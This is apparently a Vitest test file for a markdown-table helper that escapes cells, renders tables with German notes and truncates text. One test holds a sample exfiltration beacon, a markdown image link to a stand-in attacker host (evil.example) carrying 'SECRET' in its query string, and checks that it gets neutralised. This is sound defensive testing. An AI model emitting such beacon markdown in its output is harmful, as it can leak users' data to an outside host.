import { describe, expect, it } from 'vitest';
import { escapeCell, rowsToMarkdownTable, truncateText } from '../src/markdown';

describe('escapeCell', () => {
  it('escapes pipes and backslashes', () => {
    expect(escapeCell('a|b')).toBe('a\\|b');
    expect(escapeCell('a\\b')).toBe('a\\\\b');
  });

  it('flattens newlines', () => {
    expect(escapeCell('line1\nline2\r\nline3')).toBe('line1 line2 line3');
  });

  it('truncates long cells with ellipsis', () => {
    const v = escapeCell('x'.repeat(500), 10);
    expect(v).toHaveLength(10);
    expect(v.endsWith('…')).toBe(true);
  });

  it('neutralizes markdown image/link syntax (beacon exfiltration)', () => {
    expect(escapeCell('![a](https://evil.example/x?d=SECRET)')).toBe(
      '!\\[a\\](https://evil.example/x?d=SECRET)',
    );
    expect(escapeCell('[link](https://evil.example)')).toBe('\\[link\\](https://evil.example)');
    expect(escapeCell('`code`')).toBe('\\`code\\`');
  });
});

describe('rowsToMarkdownTable', () => {
  it('renders a simple table', () => {
    const md = rowsToMarkdownTable(['Region', 'Umsatz'], [['Nord', '100'], ['Süd', '200']]);
    expect(md).toBe('| Region | Umsatz |\n| --- | --- |\n| Nord | 100 |\n| Süd | 200 |');
  });

  it('truncates rows and appends a footnote', () => {
    const rows = Array.from({ length: 10 }, (_, i) => [`r${i}`]);
    const md = rowsToMarkdownTable(['col'], rows, { maxRows: 3 });
    expect(md).toContain('| r2 |');
    expect(md).not.toContain('| r3 |');
    expect(md).toContain('7 weitere Zeilen nicht angezeigt');
  });

  it('handles empty rows explicitly', () => {
    const md = rowsToMarkdownTable(['col'], []);
    expect(md).toContain('_(keine Zeilen)_');
  });

  it('handles missing cells in ragged rows', () => {
    const md = rowsToMarkdownTable(['a', 'b'], [['only-a']]);
    expect(md).toContain('| only-a |  |');
  });

  it('handles empty headers explicitly', () => {
    expect(rowsToMarkdownTable([], [['x']])).toBe('_(keine Spalten)_');
  });
});

describe('truncateText', () => {
  it('passes short text through', () => {
    expect(truncateText('abc', 10)).toBe('abc');
  });

  it('truncates long text with a note', () => {
    const out = truncateText('x'.repeat(100), 10);
    expect(out).toContain('x'.repeat(10));
    expect(out).toContain('90 Zeichen entfernt');
  });
});
